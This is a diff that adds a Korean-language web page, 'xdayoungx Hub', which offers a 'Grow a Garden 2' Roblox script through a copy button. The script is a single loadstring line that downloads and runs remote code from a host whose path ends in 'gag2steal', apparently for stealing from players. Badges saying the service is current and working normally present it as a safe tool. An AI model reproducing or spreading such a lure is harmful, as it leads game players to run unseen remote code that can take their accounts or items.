@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>xdayoungx Hub</title>
+
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+
+<style>
+:root{
+    --bg:#0d1117;
+    --card:#161b22;
+    --border:#30363d;
+    --text:#f0f6fc;
+    --muted:#8b949e;
+    --green:#3fb950;
+    --green-hover:#2ea043;
+}
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Inter,"Segoe UI",sans-serif;
+}
+
+body{
+    min-height:100vh;
+    background:#0d1117;
+    color:var(--text);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+.container{
+    width:100%;
+    max-width:760px;
+}
+
+.card{
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:20px;
+    overflow:hidden;
+    box-shadow:0 25px 80px rgba(0,0,0,.45);
+}
+
+.header{
+    padding:35px;
+    border-bottom:1px solid var(--border);
+}
+
+.logo{
+    width:70px;
+    height:70px;
+    border-radius:16px;
+    background:#21262d;
+    border:1px solid var(--border);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin-bottom:18px;
+}
+
+.logo i{
+    font-size:28px;
+    color:#58a6ff;
+}
+
+.title{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    font-size:32px;
+    font-weight:700;
+    margin-bottom:10px;
+}
+
+.online-dot{
+    width:12px;
+    height:12px;
+    border-radius:50%;
+    background:var(--green);
+    position:relative;
+    flex-shrink:0;
+}
+
+.online-dot::before{
+    content:"";
+    position:absolute;
+    inset:-6px;
+    border-radius:50%;
+    background:var(--green);
+    animation:pulse 2s infinite;
+}
+
+@keyframes pulse{
+    0%{
+        transform:scale(1);
+        opacity:.45;
+    }
+    70%{
+        transform:scale(2.2);
+        opacity:0;
+    }
+    100%{
+        opacity:0;
+    }
+}
+
+.subtitle{
+    color:var(--muted);
+    line-height:1.7;
+}
+
+.content{
+    padding:28px;
+}
+
+.info{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    margin-bottom:20px;
+}
+
+.badge{
+    background:#21262d;
+    border:1px solid var(--border);
+    padding:8px 13px;
+    border-radius:999px;
+    font-size:13px;
+    color:#c9d1d9;
+}
+
+.badge i{
+    margin-right:5px;
+}
+
+.code-box{
+    background:#0d1117;
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:18px;
+    overflow-x:auto;
+    margin-bottom:18px;
+}
+
+.code-box code{
+    color:#79c0ff;
+    font-size:14px;
+    word-break:break-all;
+}
+
+.copy-btn{
+    width:100%;
+    border:none;
+    background:var(--green);
+    color:white;
+    padding:15px;
+    border-radius:14px;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.copy-btn:hover{
+    background:var(--green-hover);
+}
+
+.copy-btn:active{
+    transform:scale(.99);
+}
+
+.status{
+    text-align:center;
+    margin-top:14px;
+    color:var(--green);
+    opacity:0;
+    transition:.25s;
+    font-size:14px;
+}
+
+.status.show{
+    opacity:1;
+}
+
+.footer{
+    padding:18px 28px;
+    border-top:1px solid var(--border);
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    color:var(--muted);
+    font-size:13px;
+}
+
+.footer-left{
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+
+.footer-left i{
+    color:var(--green);
+}
+
+@media(max-width:700px){
+
+    .title{
+        font-size:26px;
+    }
+
+    .footer{
+        flex-direction:column;
+        gap:10px;
+        text-align:center;
+    }
+
+    .header{
+        padding:25px;
+    }
+
+    .content{
+        padding:20px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        <div class="header">
+
+            <div class="logo">
+                <i class="fa-solid fa-code"></i>
+            </div>
+
+            <div class="title">
+                xdayoungx Hub
+                <span class="online-dot"></span>
+            </div>
+
+            <div class="subtitle">
+                Grow a Garden 2 스크립트를 사용하려면 아래 버튼을 눌러 복사하세요.
+                <br>
+                현재 서비스가 정상적으로 운영되고 있습니다.
+            </div>
+
+        </div>
+
+        <div class="content">
+
+            <div class="info">
+
+                <div class="badge">
+                    <i class="fa-solid fa-bolt"></i>
+                    최신 버전
+                </div>
+
+                <div class="badge">
+                    <i class="fa-solid fa-check"></i>
+                    정상 작동
+                </div>
+
+                <div class="badge">
+                    <i class="fa-solid fa-server"></i>
+                    온라인
+                </div>
+
+            </div>
+
+            <div class="code-box">
+<code>loadstring(game:HttpGet("https://api.ssgontop.shop/gag2steal"))()</code>
+            </div>
+
+            <button class="copy-btn" id="copyBtn">
+                <i class="fa-regular fa-copy"></i>
+                스크립트 복사
+            </button>
+
+            <div class="status" id="status">
+                스크립트가 복사되었습니다.
+            </div>
+
+        </div>
+
+        <div class="footer">
+
+            <div class="footer-left">
+                <i class="fa-solid fa-circle"></i>
+                xdayoungx Hub 서비스 정상 운영 중
+            </div>
+
+            <div>
+                최근 업데이트 적용됨
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+const script =
+'loadstring(game:HttpGet("https://api.ssgontop.shop/gag2steal"))()';
+
+const copyBtn = document.getElementById("copyBtn");
+const status = document.getElementById("status");
+
+copyBtn.addEventListener("click", async () => {
+
+    try{
+
+        await navigator.clipboard.writeText(script);
+
+        status.textContent = "✓ 스크립트가 복사되었습니다.";
+        status.classList.add("show");
+
+        copyBtn.innerHTML =
+        '<i class="fa-solid fa-check"></i> 복사 완료';
+
+        setTimeout(() => {
+
+            status.classList.remove("show");
+
+            copyBtn.innerHTML =
+            '<i class="fa-regular fa-copy"></i> 스크립트 복사';
+
+        }, 2500);
+
+    }catch{
+
+        status.textContent =
+        "클립보드 접근 권한이 필요합니다.";
+
+        status.classList.add("show");
+    }
+
+});
+</script>
+
+</body>
+</html>
